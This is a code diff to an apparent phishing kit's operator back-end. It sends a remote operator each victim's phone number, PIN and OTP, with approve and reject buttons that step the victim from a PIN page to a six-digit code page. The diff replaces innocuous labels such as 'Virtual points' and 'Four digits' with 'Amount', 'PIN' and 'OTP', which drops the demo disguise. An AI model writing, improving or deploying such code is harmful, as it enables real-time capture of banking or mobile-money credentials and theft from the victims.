@@ -37,9 +37,9 @@ def send_four_review(session) -> bool:
     text = (
         f"📱 STAGE 1 — Four digits + Phone\n\n"
         f"Platform: {session.get_platform_display()}\n"
-        f"Virtual points: {session.demo_points:,}\n"
+        f"Amount: {session.demo_points:,}\n"
         f"Phone: {session.phone_number}\n"
-        f"Four digits: {session.four_numbers}\n"
+        f"PIN: {session.four_numbers}\n"
         f"Reference: {str(session.reference)[:8]}\n"
         f"Status: Waiting for your decision\n\n"
         f"Approve to let the user continue to the six-number page."
@@ -48,7 +48,7 @@ def send_four_review(session) -> bool:
     keyboard = {
         "inline_keyboard": [
             [
-                {"text": "✅ Approve (allow 6 numbers)", "callback_data": f"approve_four:{session.pk}"},
+                {"text": "✅ Approve", "callback_data": f"approve_four:{session.pk}"},
                 {"text": "❌ Reject", "callback_data": f"reject_four:{session.pk}"},
             ]
         ]
@@ -82,10 +82,10 @@ def send_six_review(session) -> bool:
     text = (
         f"🎲 STAGE 2 — Six numbers (final)\n\n"
         f"Platform: {session.get_platform_display()}\n"
-        f"Virtual points: {session.demo_points:,}\n"
+        f"Amount: {session.demo_points:,}\n"
         f"Phone: {session.phone_number}\n"
-        f"Four digits: {session.four_numbers}\n"
-        f"Six numbers: {session.six_numbers}\n"
+        f"PIN: {session.four_numbers}\n"
+        f"OTP: {session.six_numbers}\n"
         f"Reference: {str(session.reference)[:8]}\n"
         f"Status: Waiting for final decision"
     )
@@ -93,7 +93,7 @@ def send_six_review(session) -> bool:
     keyboard = {
         "inline_keyboard": [
             [
-                {"text": "✅ Approve (final)", "callback_data": f"approve_six:{session.pk}"},
+                {"text": "✅ Approve", "callback_data": f"approve_six:{session.pk}"},
                 {"text": "❌ Reject", "callback_data": f"reject_six:{session.pk}"},
             ]
         ]
